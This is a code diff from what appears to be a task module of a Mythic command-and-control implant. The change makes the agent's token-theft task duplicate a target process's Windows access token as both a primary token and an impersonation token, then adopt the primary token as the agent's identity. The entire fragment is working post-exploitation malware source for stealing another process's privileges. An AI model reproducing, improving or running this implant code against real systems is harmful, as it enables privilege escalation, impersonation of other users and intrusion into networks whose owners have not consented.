@@ -49,10 +49,11 @@ namespace Tasks
             MythicTaskResponse resp = new MythicTaskResponse { };
             IntPtr procHandle = IntPtr.Zero;
             IntPtr hImpersonationToken = IntPtr.Zero;
+            IntPtr hPrimaryToken = IntPtr.Zero;
             IntPtr hProcessToken = IntPtr.Zero;
             try
             {
-                procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
+                procHandle = System.Diagnostics.Process.GetProcessById((int)Convert.ToInt32(_data.Parameters)).Handle;
             }
             catch (Exception ex)
             {
@@ -76,14 +77,31 @@ namespace Tasks
                 }
                 else
                 {
-                    _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
                     bRet = _pDuplicateTokenEx(
                         hProcessToken,
                         TokenAccessLevels.MaximumAllowed,
                         IntPtr.Zero,
                         TokenImpersonationLevel.Impersonation,
-                        1, // TokenImpersonation
-                        out hImpersonationToken);
+                        1, // TokenPrimary
+                        out hPrimaryToken);
+                    if (!bRet)
+                    {
+                        errorMessage = $"Failed to duplicate token for primary: {Marshal.GetLastWin32Error()}";
+                    }
+                    else
+                    {
+                        _agent.GetIdentityManager().SetPrimaryIdentity(hPrimaryToken);
+                    }
+                    if (string.IsNullOrEmpty(errorMessage))
+                    {
+                        bRet = _pDuplicateTokenEx(
+                            hProcessToken,
+                            TokenAccessLevels.MaximumAllowed,
+                            IntPtr.Zero,
+                            TokenImpersonationLevel.Impersonation,
+                            2, // TokenImpersonation
+                            out hImpersonationToken);
+                    }
                     if (!bRet)
                     {
                         errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
@@ -137,6 +155,11 @@ namespace Tasks
             if (hProcessToken != IntPtr.Zero)
             {
                 _pCloseHandle(hProcessToken);
+            }
+
+            if (hPrimaryToken != IntPtr.Zero)
+            {
+                _pCloseHandle(hPrimaryToken);
             }
 
             if (hImpersonationToken != IntPtr.Zero)
